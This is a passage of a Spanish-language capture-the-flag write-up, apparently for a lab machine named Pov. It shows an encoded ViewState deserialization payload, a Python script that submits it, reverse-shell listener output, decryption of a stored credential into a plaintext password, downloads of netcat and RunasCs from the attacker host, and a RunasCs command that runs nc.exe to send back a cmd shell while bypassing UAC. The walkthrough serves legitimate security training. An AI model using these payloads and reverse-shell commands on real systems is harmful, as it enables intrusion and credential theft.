0vRPvF87jgpHzUcrvuFYRyMM1cdEg1rtMMuXqiIjQUoHM5AOBlBYxUws37qY6CUDfCis7X%2BeuJhqmlJL9CXFdB1%2BhVmZ9HIfWVIwwtfmiqRZ6DCnsR5LE73I%2FptBV2mInZMVL4YFh4WUonC9seAC7%2BWil8K8dFigrefYZfFZMGx4sI9jM8jKbue%2FpdPUUgeShKJQLx8PgqyK3PmuYcSqYfKo1H9K%2Buuo3ZlJsIHRu253L8ZMlSd6DrPfLX%2Ft8yxMpp06kgS2Yr6KjThBCbXDAVoci0ZVpez5ix%2FdBNIZIGv%2BjelNgxAIB6x%2BoTGYf4c0Ffryrvcl2CrjLpkSnU7kqoOTkZgUugUeEDAWyU3b0oHZ1JkqHBHqtc0gVA4QkDdDvGvVhcIMGy3iXVeU9A8LrJZYlIbdAuaNbnSI28k8lu5w2aDmmZEBiKqJXrd%2B7aQvSqYlwxl02BKB0LzhAmMrBCvP8rB%2BHugTGuLWJ3jxMZuJWek9%2FGvz4mrfzoTeWu6UfyHKkUaVNcyp1ndMr9ICmtPUNmBWTXeJg5T%2Bl98qNzi16pD%2F%2BnrCLzmf5vzt3iYOiwP7r8mFpSmT2uPMS2YMZ%2F5FaQLl0bfOoILeH5TMkfHDLKIKIC%2BXXHkTEiqL3areyGVlH1mVavzMeb2Zd7W%2Fe33v%2BjBHuw1pzTbWbsEtvrbzltA9FAVtFtBGXQBZvvfB%2BX6CG8eB0MDWpAVtRS%2BwVqCRVe2i78uIAMyzYhtkEiveq8GLyuYAu49p%2BpnQAsfekWhGFc8k73%2BiulLV%2Bk4xSLjq56DYRSCSBaq8XoLPT9ZOV0wAj%2FM9jNiH3fTN4bLnqC6ETl7g2L%2FSjRmbF9D6e%2F32g%2BLPWwweH%2FmHUCcQ1L254%2BCGZXhf4T4g%2B4t2AETja6F918YMMJk1TVLxVpPeDdPx4F8bAJL3%2FDQ7EQ%2BWPNJFT6%2B4mtJkn%2Fo1XcoAM7E4QzVg7nDOwr2L5mBHd02ykqY%2BUreJkkF0kWvDvaEJiTgF3v1mYw59agZStKYxv9VMBfJ%2BMiORT8Gh9iqiGLAFoOwbcQVoyGDT122ACwgGfmgQg6lcmkTuLECTa0QjlELrG76NUJi6dFb9%2FbqH6U%2F%2BFD9l8JYbFNdsVZQKfi%2FH68zKNdiUE31kuG5E64mHS8z2dv9v%2Bza83go5WyIh2EJQ88kTy4CKhOCfeSHqqybftpJIb2hSvSGR6Rf3j0tY3AQx9GtaMgyThDDvUIihPILyd5DTZnDSY1nSQMFeuX50AlMeqwIzPLFmXCuN9vy0W1LuLjnzMxdFblI6qxEIUq9HzPQKGTHjepmxx%2Fddt7IGu9bBeoqW6k2oHrGQEGgKa3KHyE8lWGxWAViFZYGlY9YtMq5TyLgn%2BnUZxG8d6G3ePE0bI2%2BYDvCRH69ofD%2FjxALK4UUCKGwP3QGLO1YmFKx0Tk3eWT4vx%2BiWktLDXVEokMBFZXFopuZQBRP12Q7oDPmRQtPRoUNxU3w0RsHjEDIzU5fQpfdPm1KrBQhJt1NVzT7yHBrSg8vujiBjgozskvCrPg75e1dNMmVDc7d3xrHoiCmlaACrxM%2B%2BJu1PcnTNtQaRXD3zk78Lwh6ZqRjof4V%2BiKKDC2o6D9klArbLo8HBx2XYedv59oL5v%2B6uWiDtiU%2FHw5ohtAt18fmb56mfKbWQWr%2Bo7xHh4eTCFDuyamAvcfLk0B9JAdQVRHAO5M8FVTc6siKA2F0Xxd8yJpS4fyU8b5bzildMftaIMGpWRavQXsUVEeuKZnCI6WNDurxx2uvTreAdCnVVFx7gOfRpHInywP2xGbwRrugQFhS54faF0Kw8N%2FHg9i4xhljPrN0JmCj2ObCMa%2Bne1r5qYiJSyd3DpDJB%2FKJP5PuP7BrK49GrlgMUxKHNplW8bcdzkoQ6onHJKbsaV7K24vOxkakqwyJxlGrS2%2Byua7RXEmB5m0dYkTJxiGz45Lxdp2u6bLPXG6ltFQKV%2BljKXzVdvrJ%2FRUAJEZKlf3aJ%2Bx5aEfLwOSOSZPpHTQeFVm5TDoE%2FHTshADXEMNQ%2Bu1vZjAV4WoAmUOAoWMFEc%2FY3UrDV%2Bkql6VOEBaE%2BVbuHNNK72buVn0aFRL%2BjmxyZjXZ%2Byk7hn9%2FNcgMzzToGTVJKUEVS%2B%2BYuDhvQJYt9SfFvwNjCb9thd7hNSZFrJii1vKS9nN1%2BIVu0irMn82WwAA2iAEQj%2FtOHOKLyaRYHv9yka9dX6bfxMV%2BuR4V%2F6cEI0N1zoHF1lLd8IuS%2BUhADhFGL2o%2BluhluuM%2FVW%2FpJn63vNIqcx1f%2FHwY%2BtCm0jBKVHFiiY%2FihEDQG5xQczaYhyqK575SzKYoyS5b5ky5LQI%2Bo3eFoM1ABvQzxdsP4LslZ57aaJUaNky4llWmW%2F785NadYr0n7Btv53Q84XI9cQSGg%2F58jCBOEm9248dpSUy2AZR0NwHm5b908ftGS6wtth1Ue3i4etopiFLDer4eMfnp%2BVq6BnM5XMZXOYFm4oVxOUkUJ3nHXkTqPMOvqHS3ftWC%2FOlRvG2j6%2Bnt3kn610sl0FcOo63daLKi%2BEpwwuY8H6B8knKuc5snacPkA4lPXDk9cGjVwmSsfaMuwtS9rJ7T2JqxykW7ZJobYI%2FGEQVvAlYmYbGoZRzr5vh6yPhVBtAoW5JyXtRO%2BQnUwmORRoQlBO1yF7sYvWid6GdSdN2gbLdh7uxS8W6QCLxhyuSh8I6zWOeWdjwqDyjCs1fcM5jSII3hQNZjpKBj0y7FeNfvKDpidq3jDjksHz7E3CDsl4pyiExI3uf9xhHjzQZbKDnVC%2ByI794yf8gQLNyZfqcxfDY3LbDA%2F0adHKFSe6vmDPOMyXkrzoSYkh1AhWwH4anB9hOnqcwg3pOaOaHP0ZqCWooA4%2FbsHeQMlNNPWoZuCzCDLB5DbRnS1b7T9LUlU0TDu2GBOw5HJXFXqusgdu98i%2FtE8yKTIzSQFdiLtT2miZtOKYe8TTc5i0%2FZBzxjdkH4zSzjF81PNX8lbPYQJUArQ6yymMPOIh0wu%2FFfTR8XoydzYfhcn%2FKSc2dkQfepoYVh%2Fe0HQf9Wf5EbicBXF2ZumcyUROd5%2Fj5kWNXn4BG74kk19hU9lS88jqnaCOtithxUcth5BVVNQd89iRxjEiNxyW2o7aIXMWzTMcoOu9vdIM7YzP%2BpaUxnvQFTh%2FxqRFjUy2rvSszjn%2FYK5LYpLctP3ROO%2BppxXoN7PTBOZrCSfM79TShqek%2BcOTBRpb%2Feivb0l2cvkVP1DrsiheoWVBkGFTgFKId6plAULSOsoHzRIqOPlFYqjvPlRadxmHixQwYEYbaICuPR8ZAMeWn%2BHo5GmgYmHefcXPFBY%2B3WmnFFs0dGR2DAOqGnGb%2FGRcb05n5MKsN9mbM5yU58PmbGkUt86j21V545LWRq9W%2BsFqYRkVPpUST8gPuGpUT216m0%2FcmO9eSfbwDgzEFvIdZMMF%2BRXql%2FB9HZZu8KQUsW%2Fbwz%2F7nAhsfjSiWRwzOdSzNZoIua65qphY1N8IYU%2BeNmdLUzG0LGT%2FiF4lF53FRbwMOuFwtv0ehw9WqOUWo7pwQx7A1Opj9lWq7ANLNEWcuNP%2FTfJE
</span></span></code></pre></div><p>Es importante de recalcar y anotar que este payload ser√° distinto para cada usuario, ya que la IP de atacante y puerto de escucha pueden ser distintos a los m√≠os.</p><ul><li><p>Ahora, tenemos 2 opciones:</p><ol><li>Usar <code>Burpsuite</code>, interceptar la petici√≥n enviada al servidor al clickear <code>Download CV</code> y pasar el payload a la variable <code>__VIEWSTATE</code> (tal cual fue explicado en <a href=https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter class=external-link target=_blank rel=noopener>HackTricks</a>)</li><li>Hacer un simple script en <code>Python</code> la cual env√≠a todos estos datos y peticiones, pero v√≠a consola; de manera que si perdemos la conexi√≥n -por cualquier raz√≥n que sea- podemos reconectar f√°cilmente a la m√°quina.</li></ol></li><li><p>Yo elijo la segunda opci√≥n, donde creo un simple script de <code>Python</code>:</p></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>argparse</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.parse</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>parse_arguments</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>argparse</span><span class=o>.</span><span class=n>Namespace</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span> <span class=o>=</span> <span class=n>argparse</span><span class=o>.</span><span class=n>ArgumentParser</span><span class=p>(</span><span class=n>description</span><span class=o>=</span><span class=s2>&#34;A simple argument parser example.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># Add arguments</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;-u&#39;</span><span class=p>,</span> <span class=s1>&#39;--url&#39;</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>str</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s2>&#34;Url to make POST request to. Example: http://dev.example.htb/example/&#34;</span><span class=p>,</span> <span class=n>required</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;-c&#39;</span><span class=p>,</span> <span class=s1>&#39;--command&#39;</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>str</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s1>&#39;ViewState command&#39;</span><span class=p>,</span> <span class=n>required</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>parser</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>make_POST_request</span><span class=p>(</span><span class=n>url</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>command</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span><span class=o>-&gt;</span><span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>generic_headers</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;User-Agent&#34;</span><span class=p>:</span> <span class=s2>&#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span><span class=p>,</span> <span class=s2>&#34;Accept&#34;</span><span class=p>:</span> <span class=s2>&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#34;</span><span class=p>,</span> <span class=s2>&#34;Accept-Language&#34;</span><span class=p>:</span> <span class=s2>&#34;en-US,en;q=0.5&#34;</span><span class=p>,</span> <span class=s2>&#34;Accept-Encoding&#34;</span><span class=p>:</span> <span class=s2>&#34;gzip, deflate, br&#34;</span><span class=p>,</span> <span class=s2>&#34;Content-Type&#34;</span><span class=p>:</span> <span class=s2>&#34;application/x-www-form-urlencoded&#34;</span><span class=p>,</span> <span class=s2>&#34;Upgrade-Insecure-Requests&#34;</span><span class=p>:</span> <span class=s2>&#34;1&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;__EVENTTARGET&#34;</span><span class=p>:</span> <span class=s2>&#34;download&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                  <span class=s2>&#34;__EVENTARGUMENT&#34;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                  <span class=s2>&#34;__VIEWSTATE&#34;</span><span class=p>:</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>unquote</span><span class=p>(</span><span class=n>command</span><span class=p>),</span> 
</span></span><span class=line><span class=cl>                  <span class=s2>&#34;__VIEWSTATEGENERATOR&#34;</span><span class=p>:</span> <span class=s2>&#34;8E0F0FA3&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                  <span class=s2>&#34;__EVENTVALIDATION&#34;</span><span class=p>:</span> <span class=s2>&#34;pGfjsostEYtFuRQ+WLNYLVAVMkGFgPjb4CDyPOQ+k20Bf6VSQiuoaYE7iH2XNLMQRiPHNeCRYzI/Gxbh1N4NVUaITnLyalHjhxMVG+ZsotApeeHvWBirBzUW5IHovXP985Kdnw==&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                  <span class=s2>&#34;file&#34;</span><span class=p>:</span> <span class=s2>&#34;cv.pdf&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>generic_headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>payload</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>!=</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[!] Could not execute the payload. Code status </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=si>!r}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Payload succesfully executed.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>()</span><span class=o>-&gt;</span><span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># Get user arguments</span>
</span></span><span class=line><span class=cl>    <span class=n>args</span> <span class=o>=</span> <span class=n>parse_arguments</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=c1># Make the malicious request</span>
</span></span><span class=line><span class=cl>    <span class=n>make_POST_request</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>url</span><span class=p>,</span> <span class=n>args</span><span class=o>.</span><span class=n>command</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></div><p>Finalmente corro:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 request_server_exploit.py --url &#39;http://dev.pov.htb/portfolio/&#39; --command &#39;7OOGcG4TMXWXq&lt;SNIP&gt;7pwQx7A1Opj9lWq7ANLNEWcuNP%2FTfJE&#39;
</span></span></span></code></pre></div><p>Donde <code>7OOGcG4TMXWXq&lt;SNIP>7pwQx7A1Opj9lWq7ANLNEWcuNP%2FTfJE</code> es el comando generado (y cortado para prop√≥sitos de presentaci√≥n de este WriteUp) por <code>YSoSerial.Net</code>. As√≠, en mi listener con <code>netcat</code> obtengo una conexi√≥n como el usuario <code>sfitz</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.251] 49673
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>pov\sfitz
</span></span></span></code></pre></div><ul><li>En <code>C:\Users\sfitz\Documents</code> podemos ver algunos archivos interesantes:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\windows\system32\inetsrv&gt; dir C:\Users\sfitz\Documents
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Directory: C:\Users\sfitz\Documents
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mode                LastWriteTime         Length Name
</span></span></span><span class=line><span class=cl><span class=go>----                -------------         ------ ----
</span></span></span><span class=line><span class=cl><span class=go>-a----       12/25/2023   2:26 PM           1838 connection.xml
</span></span></span></code></pre></div><p>y si chequeamos el contenido del archivo <code>connection.xml</code> tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;Objs</span> <span class=na>Version=</span><span class=s>&#34;1.1.0.1&#34;</span> <span class=na>xmlns=</span><span class=s>&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;Obj</span> <span class=na>RefId=</span><span class=s>&#34;0&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;TN</span> <span class=na>RefId=</span><span class=s>&#34;0&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;T&gt;</span>System.Management.Automation.PSCredential<span class=nt>&lt;/T&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;T&gt;</span>System.Object<span class=nt>&lt;/T&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/TN&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;ToString&gt;</span>System.Management.Automation.PSCredential<span class=nt>&lt;/ToString&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;Props&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;S</span> <span class=na>N=</span><span class=s>&#34;UserName&#34;</span><span class=nt>&gt;</span>alaading<span class=nt>&lt;/S&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;SS</span> <span class=na>N=</span><span class=s>&#34;Password&#34;</span><span class=nt>&gt;</span>01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6<span class=nt>&lt;/SS&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/Props&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/Obj&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/Objs&gt;</span>
</span></span></code></pre></div><ul><li>Somos capaces de extraer credenciales de este archivo <a href=https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters#secure-string-to-plaintext class=external-link target=_blank rel=noopener>siguiendo las instrucciones de HackTricks</a>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\windows\system32\inetsrv&gt; $user = &#34;alaading&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PS C:\windows\system32\inetsrv&gt; $pass = &#34;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6&#34; | ConvertTo-SecureString
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PS C:\windows\system32\inetsrv&gt; $cred = New-Object System.Management.Automation.PSCredential($user, $pass)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PS C:\windows\system32\inetsrv&gt; $cred.GetNetWorkCredential() | fl
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>UserName       : alaading
</span></span></span><span class=line><span class=cl><span class=go>Password       : f8gQ8fynP44ek1m3
</span></span></span><span class=line><span class=cl><span class=go>SecurePassword : System.Security.SecureString
</span></span></span><span class=line><span class=cl><span class=go>Domain         :
</span></span></span></code></pre></div><p>Donde obtenemos las credenciales: <code>alaading:f8gQ8fynP44ek1m3</code></p><ul><li>Dado que no tenemos ning√∫n servicio disponible/puerto abierto fuera del puerto <code>80</code> para <code>HTTP</code>, trataremos de pivotear al usuario <code>alaading</code> dentro de la m√°quina v√≠ctima. Para esto, pasamos un binario de <code>netcat</code> para <code>Windows</code> y la herramienta <code>RunasCs</code> (la cual puede ser descargada desde <a href=https://github.com/antonioCoco/RunasCs/releases class=external-link target=_blank rel=noopener>su repositorio de Github</a>); esto para enviarme a mi m√°quina de atacante una reverse shell en una <code>CMD</code>, pero ahora como el usuario <code>alaading</code>. Para esto, empezamos un servidor <code>HTTP</code> temporal en <code>Python</code> por el puerto <code>8000</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ls &amp;&amp; python3 -m http.server 8000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nc64.exe  RunasCs.exe
</span></span></span><span class=line><span class=cl><span class=go>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</span></span></span></code></pre></div><p>y en la m√°quina v√≠ctima descargo los archivos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Users\sfitz\Documents&gt; wget http://10.10.16.2:8000/nc64.exe -Outfile C:\Users\Public\Downloads\nc.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PS C:\Users\sfitz\Documents&gt; wget http://10.10.16.2:8000/RunasCs.exe -Outfile C:\Users\Public\Downloads\runascs.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PS C:\Users\sfitz\Documents&gt; dir C:\Users\Public\Downloads
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Directory: C:\Users\Public\Downloads
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mode                LastWriteTime         Length Name
</span></span></span><span class=line><span class=cl><span class=go>----                -------------         ------ ----
</span></span></span><span class=line><span class=cl><span class=go>-a----        5/15/2024   8:18 PM          45272 nc.exe
</span></span></span><span class=line><span class=cl><span class=go>-a----        5/15/2024   8:22 PM          51712 runascs.exe
</span></span></span></code></pre></div><ul><li>Una vez que todos los archivos han sido transferidos, decido correr <code>netcat</code> como el usuario <code>alaading</code> usando <code>RunasCs</code> para enviarme una <code>CMD</code>. Antes de esto, recordar empezar un listener con <code>netcat</code> en el puerto <code>443</code> en nuestra m√°quina de atacante:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr nc -lvnp 443
</span></span></span></code></pre></div><p>y en la m√°quina victima, corremos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Users\sfitz\Documents&gt; C:\Users\Public\Downloads\runascs.exe alaading f8gQ8fynP44ek1m3 &#34;C:\Users\Public\Downloads\nc.exe 10.10.16.2 443 -e C:\Windows\System32\cmd.exe&#34; -t 10 --bypass-uac
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>No output received from the process.
</span></span></span></code></pre></div><ul><li>Y obtenemos una shell como el usuario <code>alaading</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.251] 49677
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.17763.5329]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2018 Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Windows\system32&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>pov\alaading
</span></span></span></code></pre></div><p>donde, finalmente, podemos obtener la flag de usuario en el Desktop del usuario <code>alaading</code>.</p><hr><h2 id=nt-authoritysystem---administrador>NT Authority/System - Administrador
<a class=heading-link href=#nt-authoritysystem---administrador><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Revisando los privilegios del usuario <code>alaading</code> tenemos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Windows\system32&gt;whoami /priv
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami /priv
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PRIVILEGES INFORMATION
</span></span></span><span class=line><span class=cl><span class=go>----------------------
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Privilege Name                Description                    State
</span></span></span><span class=line><span class=cl><span class=go>============================= ============================== ========
</span></span></span><span class=line><span class=cl><span class=go>SeDebugPrivilege              Debug programs                 Disabled
</span></span></span><span class=line><span class=cl><span class=go>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
</span></span></span></code></pre></div><p><code>SeDebugPrivilege</code> podr√≠a ser interesante. No obstante, √©ste se encuentra deshabilitado.</p><ul><li>Primero, trato de usar la herramienta <code>FullPowers</code> para habilitarlo, pero falla. Luego, siguiendo las sugerencias de <a href=https://notes.morph3.blog/windows/privilege-escalation/sedebugprivilege class=external-link target=_blank rel=noopener>este blog</a>, me descargo la herramienta <a href=https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1 class=external-link target=_blank rel=noopener>psgetsys.ps1</a>. Una vez descargada, en la m√°quina v√≠ctima paso de una <code>CMD</code> a una <code>Powershell</code> simplemente corriendo:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Windows\system32&gt; powershell
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>powershell
</span></span></span><span class=line><span class=cl><span class=go>Windows PowerShell
</span></span></span><span class=line><span class=cl><span class=go>Copyright (C) Microsoft Corporation. All rights reserved.
